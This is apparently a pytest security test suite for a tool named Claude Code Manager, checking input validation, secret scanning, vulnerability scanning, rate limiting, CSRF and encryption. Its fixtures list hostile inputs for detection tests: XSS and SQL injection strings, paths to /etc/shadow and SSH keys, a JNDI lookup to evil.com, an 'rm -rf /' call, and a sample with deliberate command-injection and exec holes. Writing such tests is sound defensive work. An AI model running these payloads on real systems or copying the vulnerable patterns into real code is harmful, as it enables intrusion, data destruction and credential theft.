"""
Security validation tests for Claude Code Manager.
"""

import pytest
from unittest.mock import MagicMock, patch

from src.security import SecurityValidator
from src.security_scanner import SecurityScanner


@pytest.mark.security
class TestSecurityValidation:
    """Security validation test suite."""

    @pytest.fixture
    def security_validator(self):
        """Create security validator instance."""
        return SecurityValidator()

    @pytest.fixture
    def security_scanner(self):
        """Create security scanner instance."""
        return SecurityScanner()

    def test_input_sanitization(self, security_validator):
        """Test input sanitization and validation."""
        # Test malicious inputs
        malicious_inputs = [
            "<script>alert('xss')</script>",
            "'; DROP TABLE users; --",
            "../../../etc/passwd",
            "${jndi:ldap://evil.com/}",
            "{{7*7}}",
            "__import__('os').system('rm -rf /')"
        ]
        
        for malicious_input in malicious_inputs:
            # Should reject malicious input
            is_safe = security_validator.validate_input(malicious_input)
            assert not is_safe, f"Failed to detect malicious input: {malicious_input}"

    def test_safe_input_validation(self, security_validator):
        """Test validation of safe inputs."""
        safe_inputs = [
            "normal text",
            "user@example.com",
            "repository-name",
            "Feature: Add user authentication",
            "123456789",
            "https://github.com/user/repo"
        ]
        
        for safe_input in safe_inputs:
            is_safe = security_validator.validate_input(safe_input)
            assert is_safe, f"Incorrectly flagged safe input: {safe_input}"

    def test_content_length_validation(self, security_validator):
        """Test content length validation."""
        # Test content that's too long
        long_content = "A" * 100000  # 100KB content
        is_valid = security_validator.validate_content_length(long_content)
        assert not is_valid
        
        # Test normal content
        normal_content = "This is normal content"
        is_valid = security_validator.validate_content_length(normal_content)
        assert is_valid

    def test_file_path_validation(self, security_validator):
        """Test file path validation."""
        # Test dangerous paths
        dangerous_paths = [
            "../../../etc/passwd",
            "/etc/shadow",
            "C:\\Windows\\System32\\config\\SAM",
            "\\\\server\\share\\secrets.txt",
            "~/../../root/.ssh/id_rsa"
        ]
        
        for path in dangerous_paths:
            is_safe = security_validator.validate_file_path(path)
            assert not is_safe, f"Failed to detect dangerous path: {path}"
        
        # Test safe paths
        safe_paths = [
            "src/main.py",
            "tests/test_file.py",
            "docs/README.md",
            "config.json"
        ]
        
        for path in safe_paths:
            is_safe = security_validator.validate_file_path(path)
            assert is_safe, f"Incorrectly flagged safe path: {path}"

    def test_github_token_validation(self, security_validator):
        """Test GitHub token validation."""
        # Test valid token format
        valid_token = "ghp_1234567890abcdef1234567890abcdef12345678"
        is_valid = security_validator.validate_github_token(valid_token)
        assert is_valid
        
        # Test invalid token formats
        invalid_tokens = [
            "invalid_token",
            "",
            "ghp_short",
            "not_a_github_token"
        ]
        
        for token in invalid_tokens:
            is_valid = security_validator.validate_github_token(token)
            assert not is_valid, f"Incorrectly validated invalid token: {token}"

    def test_url_validation(self, security_validator):
        """Test URL validation."""
        # Test valid URLs
        valid_urls = [
            "https://github.com/user/repo",
            "https://api.github.com/repos/user/repo",
            "https://example.com/path?param=value"
        ]
        
        for url in valid_urls:
            is_valid = security_validator.validate_url(url)
            assert is_valid, f"Incorrectly flagged valid URL: {url}"
        
        # Test invalid/dangerous URLs
        invalid_urls = [
            "javascript:alert('xss')",
            "file:///etc/passwd",
            "ftp://internal.server/secrets",
            "data:text/html,<script>alert('xss')</script>",
            "http://localhost:22/ssh"
        ]
        
        for url in invalid_urls:
            is_valid = security_validator.validate_url(url)
            assert not is_valid, f"Failed to detect dangerous URL: {url}"

    def test_secret_detection(self, security_scanner):
        """Test secret detection in content."""
        # Test content with secrets
        secret_content = """
        # Configuration file
        API_KEY = "sk-1234567890abcdef1234567890abcdef"
        DATABASE_PASSWORD = "super_secret_password_123"
        GITHUB_TOKEN = "ghp_1234567890abcdef1234567890abcdef12345678"
        AWS_SECRET = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
        """
        
        secrets = security_scanner.scan_for_secrets(secret_content)
        assert len(secrets) > 0
        
        # Check that different types of secrets are detected
        secret_types = {secret["type"] for secret in secrets}
        assert "api_key" in secret_types or "generic_secret" in secret_types

    def test_vulnerability_scanning(self, security_scanner):
        """Test vulnerability scanning."""
        # Test code with potential vulnerabilities
        vulnerable_code = """
        import subprocess
        import os
        
        def run_command(user_input):
            # Vulnerable: Command injection
            subprocess.call(f"echo {user_input}", shell=True)
            
        def read_file(filename):
            # Vulnerable: Path traversal
            return open(filename, 'r').read()
            
        def execute_code(code):
            # Vulnerable: Code injection
            exec(code)
        """
        
        vulnerabilities = security_scanner.scan_for_vulnerabilities(vulnerable_code)
        assert len(vulnerabilities) > 0
        
        # Check for specific vulnerability types
        vuln_types = {vuln["type"] for vuln in vulnerabilities}
        expected_types = {"command_injection", "path_traversal", "code_injection"}
        assert len(vuln_types.intersection(expected_types)) > 0

    def test_dependency_vulnerability_check(self, security_scanner):
        """Test dependency vulnerability checking."""
        # Mock vulnerable dependencies
        vulnerable_deps = [
            {"name": "requests", "version": "2.25.0", "vulnerability": "CVE-2021-33503"},
            {"name": "urllib3", "version": "1.26.0", "vulnerability": "CVE-2021-33503"}
        ]
        
        with patch.object(security_scanner, '_check_dependency_vulns') as mock_check:
            mock_check.return_value = vulnerable_deps
            
            dependencies = ["requests==2.25.0", "urllib3==1.26.0"]
            vulnerabilities = security_scanner.check_dependencies(dependencies)
            
            assert len(vulnerabilities) == 2
            assert all("CVE" in vuln.get("vulnerability", "") for vuln in vulnerabilities)

    def test_rate_limiting_validation(self, security_validator):
        """Test rate limiting validation."""
        # Simulate multiple requests from same source
        client_id = "test_client"
        
        # First few requests should be allowed
        for i in range(5):
            is_allowed = security_validator.check_rate_limit(client_id)
            assert is_allowed, f"Request {i} should be allowed"
        
        # Subsequent requests should be rate limited
        for i in range(10):
            is_allowed = security_validator.check_rate_limit(client_id)
            # Depending on implementation, some may be blocked
            # This test would need to match actual rate limiting logic

    def test_authentication_validation(self, security_validator):
        """Test authentication validation."""
        # Test valid authentication
        valid_auth = {
            "token": "ghp_1234567890abcdef1234567890abcdef12345678",
            "user": "test_user"
        }
        
        is_valid = security_validator.validate_authentication(valid_auth)
        assert is_valid
        
        # Test invalid authentication
        invalid_auth = {
            "token": "invalid",
            "user": ""
        }
        
        is_valid = security_validator.validate_authentication(invalid_auth)
        assert not is_valid

    def test_configuration_security(self, security_validator):
        """Test configuration security validation."""
        # Test secure configuration
        secure_config = {
            "github": {
                "token": "ghp_valid_token_here",
                "username": "valid_user"
            },
            "security": {
                "enable_rate_limiting": True,
                "max_content_length": 10000,
                "enable_csrf": True
            }
        }
        
        is_secure = security_validator.validate_configuration(secure_config)
        assert is_secure
        
        # Test insecure configuration
        insecure_config = {
            "github": {
                "token": "hardcoded_token_123",
                "username": "admin"
            },
            "security": {
                "enable_rate_limiting": False,
                "max_content_length": 999999999,
                "enable_csrf": False
            }
        }
        
        is_secure = security_validator.validate_configuration(insecure_config)
        assert not is_secure

    def test_sql_injection_prevention(self, security_validator):
        """Test SQL injection prevention."""
        # Test SQL injection attempts
        sql_injections = [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "admin'/*",
            "1; DELETE FROM tasks WHERE 1=1; --",
            "UNION SELECT * FROM secrets"
        ]
        
        for injection in sql_injections:
            is_safe = security_validator.validate_sql_input(injection)
            assert not is_safe, f"Failed to detect SQL injection: {injection}"

    def test_xss_prevention(self, security_validator):
        """Test XSS prevention."""
        # Test XSS attempts
        xss_attempts = [
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert('xss')>",
            "javascript:alert('xss')",
            "<svg onload=alert('xss')>",
            "&#60;script&#62;alert('xss')&#60;/script&#62;"
        ]
        
        for xss in xss_attempts:
            sanitized = security_validator.sanitize_html(xss)
            assert "<script>" not in sanitized.lower()
            assert "javascript:" not in sanitized.lower()
            assert "onerror=" not in sanitized.lower()

    def test_csrf_token_validation(self, security_validator):
        """Test CSRF token validation."""
        # Generate CSRF token
        token = security_validator.generate_csrf_token()
        assert token is not None
        assert len(token) > 10
        
        # Validate CSRF token
        is_valid = security_validator.validate_csrf_token(token)
        assert is_valid
        
        # Test invalid CSRF token
        is_valid = security_validator.validate_csrf_token("invalid_token")
        assert not is_valid

    def test_encryption_functions(self, security_validator):
        """Test encryption and decryption functions."""
        # Test data encryption
        sensitive_data = "secret_information"
        encrypted = security_validator.encrypt_data(sensitive_data)
        
        assert encrypted != sensitive_data
        assert len(encrypted) > len(sensitive_data)
        
        # Test data decryption
        decrypted = security_validator.decrypt_data(encrypted)
        assert decrypted == sensitive_data

    @pytest.mark.asyncio
    async def test_async_security_validation(self, security_validator):
        """Test asynchronous security validation."""
        # Test concurrent validation requests
        import asyncio
        
        test_inputs = [
            "safe_input_1",
            "<script>alert('xss')</script>",
            "normal_text",
            "'; DROP TABLE users; --"
        ]
        
        async def validate_input_async(input_data):
            # Simulate async validation
            await asyncio.sleep(0.01)
            return security_validator.validate_input(input_data)
        
        results = await asyncio.gather(*[
            validate_input_async(input_data) for input_data in test_inputs
        ])
        
        # Check results
        assert results[0] is True   # safe_input_1
        assert results[1] is False  # XSS attempt
        assert results[2] is True   # normal_text
        assert results[3] is False  # SQL injection